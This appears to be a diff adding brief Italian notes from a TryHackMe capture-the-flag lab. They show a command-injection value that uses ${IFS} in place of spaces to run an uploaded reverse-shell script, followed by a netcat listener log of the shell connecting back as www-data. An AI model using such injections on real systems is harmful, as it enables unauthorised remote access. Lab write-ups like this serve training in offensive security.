@@ -1,0 +1,18 @@
+per fargli prendere lo spazio, si puo' usare ${IFS}
+
+yt_url=`bash${IFS}rev.sh`
+
+
+dopo aver uploadato una reverse shell onliner bash...
+
+root@kali:/opt/TryHackMe/convertmyvideo# nc -lvnp 7777
+listening on [any] 7777 ...
+connect to [10.8.147.132] from (UNKNOWN) [10.10.143.178] 41640
+bash: cannot set terminal process group (842): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dmv:/var/www/html$
+
+www-data@dmv:/var/www/html$
+
+
+
